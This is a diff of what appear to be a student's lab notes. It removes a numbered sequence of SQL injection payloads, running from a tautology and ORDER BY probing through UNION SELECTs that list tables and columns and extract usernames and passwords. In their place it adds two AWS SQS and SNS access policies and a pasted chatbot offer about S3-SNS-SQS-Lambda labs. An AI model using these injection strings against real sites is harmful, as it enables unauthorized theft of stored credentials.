@@ -1,10 +1,51 @@
-(1)   1' OR '1'='1
-(2) 1' ORDER BY 1-- -
-1' ORDER BY 2-- -
-1' ORDER BY 3-- -
+SQS Access Policy
+json
+{
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "Service": "sns.amazonaws.com"
+      },
+      "Action": "sqs:SendMessage",
+      "Resource": "SQS ARN",
+      "Condition": {
+        "ArnEquals": {
+          "aws:SourceArn": "SNS ARN"
+        }
+      }
+    }
+  ]
+}
 
-(3)1' UNION SELECT 1,2-- -
-(4)1' UNION SELECT database(),2-- -
-(5)1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
-(6)1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
-(7)1' UNION SELECT user,password FROM users-- -
+SNS Access Policy
+
+{
+  "Version": "2012-10-17",
+  "Id": "example-ID",
+  "Statement": [
+    {
+      "Sid": "Example SNS topic policy",
+      "Effect": "Allow",
+      "Principal": {
+        "Service": "s3.amazonaws.com"
+      },
+      "Action": [
+        "SNS:Publish"
+      ],
+      "Resource": "SNS topic ARN",
+      "Condition": {
+        "ArnLike": {
+          "aws:SourceArn": "s3 bucket ARN"
+        },
+        "StringEquals": {
+          "aws:SourceAccount": "account id"
+        }
+      }
+    }
+  ]
+}
+
+
+
+If you want, I can also show the **complete architecture flow for S3 → SNS → SQS → Lambda** which is very useful for **AWS lab experiments and viva questions**.
